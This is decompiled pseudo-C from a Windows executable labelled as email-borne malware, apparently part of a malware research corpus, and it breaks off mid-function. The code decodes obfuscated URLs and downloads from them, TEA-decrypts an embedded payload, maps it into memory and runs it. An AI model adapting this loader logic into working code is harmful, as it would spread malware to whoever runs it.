/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0729/ia32_pe/subject.exe'
 */

/*	Procedure: 0x003E1000 - 0x003E101D
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1000(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    (save)ecx;
    *(ebp - 8) = A8;
    eax = *(ebp - 8);
    *(ebp - 4) = *(ebp - 8) + *(eax + 60);
    return(*(ebp - 4));
}

/*	Procedure: 0x003E101E - 0x003E1046
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E101E(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    L003E1EA7(Ac, A8, A10);
    return(*__imp__VirtualProtect(Ac, A10, 2, ebp - 4));
}

stack space not deallocated on return
/*	Procedure: 0x003E1047 - 0x003E1081
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1047()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    if(*(ebp + 8) == 0 || *(ebp + 8) == *L003E9A1C) {
        *(ebp + 8) = *L003E9A18;
    }
    eax = *L003e9a10( *(ebp + 8), *(ebp + 12), *(ebp + 16));
    (restore)ebp;
}

/*	Procedure: 0x003E1082 - 0x003E10B1
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1082(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(A8 == 0 || A8 == *L003E9A1C) {
        A8 = *L003E9A18;
    }
    return(*L003e9a14(A8, Ac, A10));
}

stack space not deallocated on return
/*	Procedure: 0x003E10B2 - 0x003E1124
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E10B2()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    (save) *(ebp + 16);
    (save) *(ebp + 8);
    *(ebp - 4) = *__imp__GetProcAddress();
    if(L003E1F8E( *(ebp + 12), 4075600) == 0) {
        if(L003E1F12( *(ebp + 16), 4075616) == 0) {
            *L003E9A10 = *(ebp - 4);
            eax = 0x3e1050;
        } else {
            if(L003E1F12( *(ebp + 16), 4075636) != 0) {
                goto L003e111f;
            }
            *L003E9A14 = *(ebp - 4);
            eax = 0x3e1082;
        }
    } else {
L003e111f:
        eax = *(ebp - 4);
    }
    esp = ebp;
}

/*	Procedure: 0x003E1125 - 0x003E1138
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1125(A8)
/* unknown */ void  A8;
{



    eax = ~(A8 & -2147483648);
    asm("sbb eax,eax");
    return(~eax);
}

stack space not deallocated on return
/*	Procedure: 0x003E1139 - 0x003E1262
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1139()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 36;
    *L003E9A18 = *__imp__GetModuleHandleA(0);
    *L003E9A1C = *(ebp + 12);
    *(ebp - 8) = *(ebp + 8) + 128;
    (save) *(ebp + 12);
    for(*(ebp - 4) = ecx + *( *(ebp - 8)); 1; *(ebp - 4) = *(ebp - 4) + 20) {
        eax = *(ebp - 4);
        if(*(eax + 12) == 0) {
            break;
        }
        *(ebp - 12) = 0;
        *(ebp - 16) = 0;
        eax = *(ebp - 4);
        *(ebp - 28) = *(ebp + 12) + *(eax + 12);
        *(ebp - 24) = *__imp__LoadLibraryA( *(ebp - 28));
        if(*( *(ebp - 4) + 4) != 0) {
            eax = *(ebp - 4);
            *(ebp - 12) = *(ebp + 12) + *eax;
        } else {
            (save) *(ebp + 12);
            *(ebp - 12) = ecx + *( *(ebp - 4) + 16);
        }
        eax = *(ebp - 4);
        for(*(ebp - 20) = *(ebp + 12) + *(eax + 16); *( *(ebp - 12)) != 0; *(ebp - 12) = *(ebp - 12) + 4) {
            (save) *(ebp - 24);
            L003E1125( *( *(ebp - 12)));
            if((al & 255) == 0) {
                eax = *(ebp - 12);
                *(ebp - 36) = *(ebp + 12) + *eax;
                *(ebp - 16) = L003E10B2( *(ebp - 24), *(ebp - 28), *(ebp - 36) + 1 + 1);
            } else {
                *(ebp - 32) = *( *(ebp - 12)) & 65535;
                (save) *(ebp - 32) & 65535;
                (save) *(ebp - 24);
                *(ebp - 16) = *__imp__GetProcAddress();
            }
            eax = *(ebp - 20);
            *eax = *(ebp - 16);
            *(ebp - 20) = *(ebp - 20) + 4;
        }
    }
    esp = ebp;
}

/*	Procedure: 0x003E1263 - 0x003E126F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1263()
{



}

stack space not deallocated on return
/*	Procedure: 0x003E1270 - 0x003E12A6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1270()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__ReadFile( *(ebp + 8), *(ebp + 12), *(ebp + 16) - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e1295;
        }
        eax = *(ebp - 4);
    } while(eax != *(ebp + 16));
    goto L003e12a3;
L003e1295:
    al = 0;
    goto L003e12a5;
L003e12a3:
    eax = 1 & 255;
L003e12a5:
}

stack space not deallocated on return
/*	Procedure: 0x003E12A7 - 0x003E12DE
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E12A7()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = 0;
    do {
        eax = *__imp__WriteFile( *(ebp + 8), *(ebp + 12), *(ebp + 16) - *(ebp - 4), ebp - 4, 0);
        if(eax == 0) {
            goto L003e12cc;
        }
        eax = *(ebp - 4);
    } while(eax != *(ebp + 16));
    goto L003e12db;
L003e12cc:
    al = 0;
    goto L003e12dd;
L003e12db:
    eax = 1 & 255;
L003e12dd:
}

/*	Procedure: 0x003E12DF - 0x003E1332
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E12DF(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = 0; 1; *(ebp - 4) = *(ebp - 4) + 1 + 1) {
        eax = *(ebp - 4);
        if(eax >= A10) {
            break;
        }
        eax = *(ebp - 4);
        L003E12A7( *(A8 + 4), Ac + eax * 4, 8);
        eax = *(ebp - 4);
        L003E1270( *A8, Ac + eax * 4, 8);
    }
}

/*	Procedure: 0x003E1333 - 0x003E1423
 *	Argument size: -28
 *	Local size: 32
 *	Save regs size: 0
 */

L003E1333(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    for(Vfffffff4 = A8; 1; L003E12A7( *(Vfffffff4 + 4), & Vfffffff8, 8)) {
        L003E1270( *Vfffffff4, & Vfffffff8, 8);
        if((al & 255) == 0) {
            break;
        }
        Vffffffec = 32;
        Vfffffff0 = Vfffffff8;
        Vffffffe8 = Vfffffffc;
        Vffffffe0 = -1640531527;
        for(Vffffffe4 = Vffffffe0 << 5; 1; Vffffffe4 = Vffffffe4 - Vffffffe0) {
            Vffffffec = Vffffffec - 1;
            if(Vffffffec <= 0) {
                break;
            }
            Vffffffe8 = Vffffffe8 - ((Vfffffff0 << 4) + *L0041105E ^ Vfffffff0 + Vffffffe4 ^ (Vfffffff0 >> 5) + *L00411062);
            Vfffffff0 = Vfffffff0 - ((Vffffffe8 << 4) + *L00411056 ^ Vffffffe8 + Vffffffe4 ^ (Vffffffe8 >> 5) + *L0041105A);
        }
        Vfffffff8 = Vfffffff0;
        Vfffffffc = Vffffffe8;
    }
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x003E1424 - 0x003E143F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1424()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save) *( *(ebp + 8));
    *__imp__CloseHandle();
    return(*__imp__CloseHandle( *( *(ebp + 8) + 4)));
}

/*	Procedure: 0x003E1440 - 0x003E15B3
 *	Argument size: -48
 *	Local size: 48
 *	Save regs size: 0
 */

L003E1440()
{
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = L003E1B30();
    Vffffffe8 = *(Vfffffffc + 48);
    if(( *(Vffffffe8 + 2) & 255) != 0) {
        eax = 0;
    } else {
        *L00411056 = 30301;
        *L0041105A = 5484;
        *L0041105E = 29306;
        *L00411062 = 8655;
        (save)16;
        (save)0;
        (save) & Vfffffff0;
        (save) & Vffffffe0;
        if(*__imp__CreatePipe() == 0) {
            eax = 0;
        } else {
            (save)16;
            (save)0;
            (save) & Vffffffe4;
            (save) & Vffffffec;
            if(*__imp__CreatePipe() == 0) {
                eax = 0;
            } else {
                (save) & Vfffffff8;
                (save)0;
                (save) & Vffffffe0;
                (save)0x3e1333;
                (save)0;
                (save)0;
                Vffffffdc = *__imp__CreateThread();
                L003E12DF( & Vffffffec, 0x3e4000, *L003E9A03 >> 2);
                L003E1424( & Vffffffec);
                L003E1424( & Vffffffe0);
                (save)Vffffffdc;
                *__imp__CloseHandle();
                Vfffffff4 = L003E1000(0x3e4000);
                if(Vfffffff4 != 0) {
                    Vffffffd4 = *(Vfffffff4 + 52);
                    L003E101E(0x3e4000, Vffffffd4, *(Vfffffff4 + 84));
                    L003E1B40(Vfffffff4, 0x3e4000, Vffffffd4);
                    Vffffffd8 = L003E1000(Vffffffd4);
                    if(Vffffffd8 != 0) {
                        L003E1139(Vffffffd8, Vffffffd4);
                        L003E1CD1(Vffffffd8, Vffffffd4);
                        *(Vffffffe8 + 8) = Vffffffd4;
                        Vffffffd0 = Vffffffd4 + *(Vfffffff4 + 40);
                        Vffffffd0();
                    }
                }
                eax = 0;
            }
        }
    }
}

/*	Procedure: 0x003E15B4 - 0x003E15F9
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L003E15B4(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    (save)ecx;
    *(ebp - 8) = 0;
    for(*(ebp - 4) = 0; *__imp__InternetReadFile(A8, Ac + *(ebp - 8), A10 - *(ebp - 8), ebp - 4) != 0 && *(ebp - 4) != 0; *(ebp - 8) = *(ebp - 8) + *(ebp - 4)) {
    }
    return(*(ebp - 8));
}

/*	Procedure: 0x003E15FA - 0x003E1626
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E15FA()
{
	/* unknown */ void  ebp;



    for(ebp = esp; 1; *(ebp + 8) = *(ebp + 8) + 1) {
        eax = *( *(ebp + 8)) & 255;
        if(eax == 0) {
            break;
        }
        eax = *( *(ebp + 8)) & 255;
        ecx = 255 - eax;
        *( *(ebp + 8)) = cl;
    }
}

/*	Procedure: 0x003E1627 - 0x003E1677
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1627(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    for((save)ecx; ( *A8 & 255) != 0; *__imp__OutputDebugStringA()) {
        *(ebp - 4) = *A8 & 255;
        L003E20C9( *(ebp - 4), Ac, 10);
        A8 = A8 + 1;
        (save)Ac;
        *__imp__OutputDebugStringA();
        (save)4075664;
    }
    return(*__imp__OutputDebugStringA(4075668));
}

stack space not deallocated on return
/*	Procedure: 0x003E1678 - 0x003E1B11
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1678()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 172;
    *(ebp - 80) = 178;
    *(ebp - 79) = 144;
    *(ebp - 78) = 81;
    *(ebp - 78) = *(ebp - 78) + 52;
    *(ebp - 77) = 150;
    *(ebp - 76) = 147;
    *(ebp - 75) = 147;
    *(ebp - 74) = 27;
    *(ebp - 74) = *(ebp - 74) + 131;
    *(ebp - 73) = 5;
    *(ebp - 73) = *(ebp - 73) + 203;
    *(ebp - 72) = 203;
    *(ebp - 71) = 209;
    *(ebp - 70) = 177;
    *(ebp - 70) = *(ebp - 70) + 30;
    *(ebp - 69) = 223;
    *(ebp - 68) = 215;
    *(ebp - 67) = 156;
    *(ebp - 66) = 120;
    *(ebp - 66) = *(ebp - 66) + 24;
    *(ebp - 65) = 146;
    *(ebp - 64) = 47;
    *(ebp - 64) = *(ebp - 64) + 96;
    *(ebp - 63) = 158;
    *(ebp - 62) = 139;
    *(ebp - 61) = 150;
    *(ebp - 60) = 98;
    *(ebp - 60) = *(ebp - 60) + 59;
    *(ebp - 59) = 143;
    *(ebp - 59) = *(ebp - 59) + 4;
    *(ebp - 58) = 85;
    *(ebp - 58) = *(ebp - 58) + 69;
    *(ebp - 57) = 100;
    *(ebp - 57) = *(ebp - 57) + 96;
    *(ebp - 56) = 223;
    *(ebp - 55) = 178;
    *(ebp - 54) = 2;
    *(ebp - 54) = *(ebp - 54) + 170;
    *(ebp - 53) = 32;
    *(ebp - 53) = *(ebp - 53) + 150;
    *(ebp - 52) = 101;
    *(ebp - 52) = *(ebp - 52) + 85;
    *(ebp - 51) = 223;
    *(ebp - 50) = 138;
    *(ebp - 50) = *(ebp - 50) + 63;
    *(ebp - 49) = 165;
    *(ebp - 49) = *(ebp - 49) + 44;
    *(ebp - 48) = 207;
    *(ebp - 47) = 157;
    *(ebp - 46) = 162;
    *(ebp - 46) = *(ebp - 46) + 34;
    *(ebp - 45) = 144;
    *(ebp - 45) = *(ebp - 45) + 79;
    *(ebp - 44) = 110;
    *(ebp - 44) = *(ebp - 44) + 58;
    *(ebp - 43) = 150;
    *(ebp - 42) = 145;
    *(ebp - 41) = 155;
    *(ebp - 40) = 144;
    *(ebp - 39) = 95;
    *(ebp - 39) = *(ebp - 39) + 41;
    *(ebp - 38) = 70;
    *(ebp - 38) = *(ebp - 38) + 70;
    *(ebp - 37) = 223;
    *(ebp - 36) = 26;
    *(ebp - 36) = *(ebp - 36) + 151;
    *(ebp - 35) = 163;
    *(ebp - 35) = *(ebp - 35) + 8;
    *(ebp - 34) = 24;
    *(ebp - 34) = *(ebp - 34) + 199;
    *(ebp - 33) = 202;
    *(ebp - 32) = 7;
    *(ebp - 32) = *(ebp - 32) + 202;
    *(ebp - 31) = 207;
    *(ebp - 30) = 35;
    *(ebp - 30) = *(ebp - 30) + 161;
    *(ebp - 29) = 223;
    *(ebp - 28) = 209;
    *(ebp - 27) = 164;
    *(ebp - 27) = *(ebp - 27) + 13;
    *(ebp - 26) = 186;
    *(ebp - 25) = 147;
    *(ebp - 25) = *(ebp - 25) + 24;
    *(ebp - 24) = 184;
    *(ebp - 24) = *(ebp - 24) + 39;
    *(ebp - 23) = 188;
    *(ebp - 22) = 119;
    *(ebp - 22) = *(ebp - 22) + 60;
    *(ebp - 21) = 173;
    *(ebp - 20) = 37;
    *(ebp - 20) = *(ebp - 20) + 186;
    *(ebp - 19) = 185;
    *(ebp - 19) = *(ebp - 19) + 21;
    *(ebp - 18) = 142;
    *(ebp - 18) = *(ebp - 18) + 67;
    *(ebp - 17) = 150;
    *(ebp - 17) = *(ebp - 17) + 57;
    *(ebp - 16) = 196;
    *(ebp - 16) = *(ebp - 16) + 13;
    *(ebp - 15) = 193;
    *(ebp - 15) = *(ebp - 15) + 12;
    *(ebp - 14) = 124;
    *(ebp - 14) = *(ebp - 14) + 74;
    *(ebp - 13) = 12;
    *(ebp - 13) = *(ebp - 13) + 194;
    *(ebp - 12) = 203;
    *(ebp - 11) = 214;
    *(ebp - 10) = 0;
    *(ebp - 124) = 129;
    *(ebp - 124) = *(ebp - 124) + 22;
    *(ebp - 123) = 59;
    *(ebp - 123) = *(ebp - 123) + 80;
    *(ebp - 122) = 139;
    *(ebp - 121) = 143;
    *(ebp - 120) = 84;
    *(ebp - 120) = *(ebp - 120) + 113;
    *(ebp - 119) = 208;
    *(ebp - 118) = 208;
    *(ebp - 117) = 3;
    *(ebp - 117) = *(ebp - 117) + 155;
    *(ebp - 116) = 5;
    *(ebp - 116) = *(ebp - 116) + 135;
    *(ebp - 115) = 13;
    *(ebp - 115) = *(ebp - 115) + 126;
    *(ebp - 114) = 76;
    *(ebp - 114) = *(ebp - 114) + 82;
    *(ebp - 113) = 145;
    *(ebp - 112) = 158;
    *(ebp - 111) = 206;
    *(ebp - 110) = 52;
    *(ebp - 110) = *(ebp - 110) + 146;
    *(ebp - 109) = 199;
    *(ebp - 108) = 126;
    *(ebp - 108) = *(ebp - 108) + 73;
    *(ebp - 107) = 209;
    *(ebp - 106) = 153;
    *(ebp - 105) = 141;
    *(ebp - 104) = 151;
    *(ebp - 104) = *(ebp - 104) + 3;
    *(ebp - 103) = 19;
    *(ebp - 103) = *(ebp - 103) + 135;
    *(ebp - 102) = 143;
    *(ebp - 102) = *(ebp - 102) + 8;
    *(ebp - 101) = 17;
    *(ebp - 101) = *(ebp - 101) + 127;
    *(ebp - 100) = 138;
    *(ebp - 100) = *(ebp - 100) + 2;
    *(ebp - 99) = 139;
    *(ebp - 98) = 150;
    *(ebp - 97) = 158;
    *(ebp - 96) = 209;
    *(ebp - 95) = 112;
    *(ebp - 95) = *(ebp - 95) + 44;
    *(ebp - 94) = 144;
    *(ebp - 93) = 109;
    *(ebp - 93) = *(ebp - 93) + 37;
    *(ebp - 92) = 0;
    *(ebp + -152) = 151;
    *(ebp + -151) = 1;
    *(ebp + -151) = *(ebp + -151) + 138;
    *(ebp + -150) = 139;
    *(ebp + -149) = 143;
    *(ebp + -148) = 197;
    *(ebp + -147) = 201;
    *(ebp + -147) = *(ebp + -147) + 7;
    *(ebp + -146) = 208;
    *(ebp + -145) = 17;
    *(ebp + -145) = *(ebp + -145) + 141;
    *(ebp + -144) = 96;
    *(ebp + -144) = *(ebp + -144) + 44;
    *(ebp + -143) = 19;
    *(ebp + -143) = *(ebp + -143) + 120;
    *(ebp + -142) = 158;
    *(ebp + -141) = 112;
    *(ebp + -141) = *(ebp + -141) + 33;
    *(ebp + -140) = 158;
    *(ebp + -139) = 147;
    *(ebp + -139) = *(ebp + -139) + 62;
    *(ebp + -138) = 49;
    *(ebp + -138) = *(ebp + -138) + 105;
    *(ebp + -137) = 135;
    *(ebp + -136) = 117;
    *(ebp + -136) = *(ebp + -136) + 27;
    *(ebp + -135) = 88;
    *(ebp + -135) = *(ebp + -135) + 65;
    *(ebp + -134) = 150;
    *(ebp + -133) = 141;
    *(ebp + -132) = 154;
    *(ebp + -131) = 113;
    *(ebp + -131) = *(ebp + -131) + 96;
    *(ebp + -130) = 45;
    *(ebp + -130) = *(ebp + -130) + 100;
    *(ebp + -129) = 154;
    *(ebp - 128) = 27;
    *(ebp - 128) = *(ebp - 128) + 112;
    *(ebp - 127) = 0;
    *(ebp - 88) = 7605;
    *(ebp - 88) = *(ebp - 88) + 67637835;
    *(ebp + -164) = L003E1DDA(4096);
    *(ebp - 4) = *(ebp + -164);
    L003E15FA(ebp - 80);
    L003E15FA(ebp - 124);
    L003E15FA(ebp + -152);
    (save)0;
    (save)0;
    (save)0;
    (save)1;
    (save)ebp - 80;
    *(ebp - 84) = *__imp__InternetOpenA();
    if(*(ebp - 84) != 0) {
        for(*(ebp + -156) = 0; *(ebp + -156) < 2; *(ebp + -156) = *(ebp + -156) + 1) {
            *(ebp + -172) = *(ebp + -156) != 0 ? ebp + -152 : ebp - 124;
            (save)0;
            (save) *(ebp - 88);
            (save)0;
            (save)0;
            (save) *(ebp + -172);
            (save) *(ebp - 84);
            *(ebp + -160) = *__imp__InternetOpenUrlA();
            if(*(ebp + -160) != 0) {
                L003E15B4( *(ebp + -160), *(ebp - 4), 4096);
                (save) *(ebp + -160);
                *__imp__InternetCloseHandle();
            }
        }
        (save) *(ebp - 84);
        *__imp__InternetCloseHandle();
    }
    *(ebp + -168) = *(ebp - 4);
    eax = L003E1DE1( *(ebp + -168));
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1B12 - 0x003E1B2D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

__entry_point__()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    L003E1678();
    *(ebp - 4) = L003E1440();
    return(*__imp__ExitProcess( *(ebp - 4)));
}

/*	Procedure: 0x003E1B2E - 0x003E1B2F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1B2E()
{



    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1B30 - 0x003E1B3A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1B30()
{



    return(*%fs:0x18]);
}

/*	Procedure: 0x003E1B3B - 0x003E1B3F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1B3B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x003E1B40 - 0x003E1C08
 *	Argument size: -28
 *	Local size: 40
 *	Save regs size: 0
 */

L003E1B40(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8 + 248;
    Vfffffff8 = *(A8 + 6);
    Vfffffffc = Vfffffff4;
    for(Vfffffff0 = 0; 1; Vfffffff0 = Vfffffff0 + 1) {
        eax = Vfffffff0 & 65535;
        if(eax >= (Vfffffff8 & 65535)) {
            break;
        }
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffdc = *(eax + Vfffffffc + 8);
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffec = *(eax + Vfffffffc + 16);
        Vffffffd8 = Vffffffdc >= Vffffffec ? Vffffffec : Vffffffdc;
        Vffffffe8 = Vffffffd8;
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffe4 = A10 + *(eax + Vfffffffc + 12);
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffe0 = Ac + *(eax + Vfffffffc + 20);
        L003E1EA7(Vffffffe4, Vffffffe0, Vffffffe8);
    }
}

/*	Procedure: 0x003E1C09 - 0x003E1CD0
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1C09(A8)
/* unknown */ void  A8;
{



    (save)ecx;
    *(ebp - 4) = 0;
    if(!(eax = A8 & 67108864)) {
        *(ebp - 4) = *(ebp - 4) | 512;
    }
    *(ebp - 4) = !(eax = A8 & 536870912) ? !(eax = A8 & 1073741824) ? !(eax = A8 & -2147483648) ? *(ebp - 4) | 64 : *(ebp - 4) | 32 : !(eax = A8 & -2147483648) ? *(ebp - 4) | 128 : *(ebp - 4) | 16 : !(eax = A8 & 1073741824) ? !(eax = A8 & -2147483648) ? *(ebp - 4) | 4 : *(ebp - 4) | 2 : !(eax = A8 & -2147483648) ? *(ebp - 4) | 8 : *(ebp - 4) | 1;
    return(*(ebp - 4));
}

/*	Procedure: 0x003E1CD1 - 0x003E1D62
 *	Argument size: -20
 *	Local size: 28
 *	Save regs size: 0
 */

L003E1CD1(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = A8 + 248;
    Vfffffff8 = *(A8 + 6);
    Vfffffffc = Vfffffff4;
    for(Vfffffff0 = 0; 1; Vfffffff0 = Vfffffff0 + 1) {
        eax = Vfffffff0 & 65535;
        if(eax >= (Vfffffff8 & 65535)) {
            break;
        }
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffe8 = Ac + *(eax + Vfffffffc + 12);
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        Vffffffe4 = *(eax + Vfffffffc + 8);
        eax = Vfffffff0 & 65535;
        40 = eax * eax;
        *__imp__VirtualProtect(Vffffffe8, Vffffffe4, L003E1C09( *(eax + Vfffffffc + 36)), & Vffffffec);
    }
}

/*	Procedure: 0x003E1D63 - 0x003E1D6F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1D63()
{



}

/*	Procedure: 0x003E1D70 - 0x003E1D8B
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1D70(A8)
/* unknown */ void  A8;
{



    if(A8 >= 65) {
        if(A8 > 90) {
            goto L003e1d87;
        }
        A8 = A8 + 32;
    } else {
L003e1d87:
    }
}

/*	Procedure: 0x003E1D8C - 0x003E1DA8
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1D8C(A8)
/* unknown */ void  A8;
{



    if(A8 >= 97) {
        if(A8 > 122) {
            goto L003e1da3;
        }
        A8 = A8 - 32;
    } else {
L003e1da3:
    }
}

/*	Procedure: 0x003E1DA9 - 0x003E1DB4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1DA9()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

/*	Procedure: 0x003E1DB5 - 0x003E1DB9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1DB5()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E1DBA - 0x003E1DC6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1DBA()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
    return(0);
}

/*	Procedure: 0x003E1DC7 - 0x003E1DCD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1DC7()
{
	/* unknown */ void  ebp;



    ebp = esp;
    return(0);
}

/*	Procedure: 0x003E1DCE - 0x003E1DD4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1DCE()
{



    return(0);
}

/*	Procedure: 0x003E1DD5 - 0x003E1DD9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1DD5()
{



}

/*	Procedure: 0x003E1DDA - 0x003E1DE0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1DDA()
{
	/* unknown */ void  ebp;



    ebp = esp;
    return(0);
}

/*	Procedure: 0x003E1DE1 - 0x003E1DE5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1DE1()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

/*	Procedure: 0x003E1DE6 - 0x003E1DF4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1DE6()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1DF5 - 0x003E1E04
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1DF5()
{
	/* unknown */ void  ebp;



    ebp = esp;
    (save)ecx;
    *(ebp - 4) = *(ebp + 8);
    *(ebp - 3) = 0;
    esp = ebp;
}

/*	Procedure: 0x003E1E05 - 0x003E1E09
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1E05()
{
	/* unknown */ void  ebp;



    ebp = esp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1E0A - 0x003E1E22
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1E0A()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 32;
    eax = L003E20C9( *(ebp + 8), ebp - 32, 10);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1E23 - 0x003E1E3B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L003E1E23()
{
	/* unknown */ void  ebp;



    ebp = esp;
    esp = esp - 32;
    eax = L003E1FF0( *(ebp + 8), ebp - 32, 10);
    esp = ebp;
}

stack space not deallocated on return
/*	Procedure: 0x003E1E3C - 0x003E1EA6
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L003E1E3C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = *(ebp + 8); *(ebp + 16) != 0; *(ebp + 16) = *(ebp + 16) - 1) {
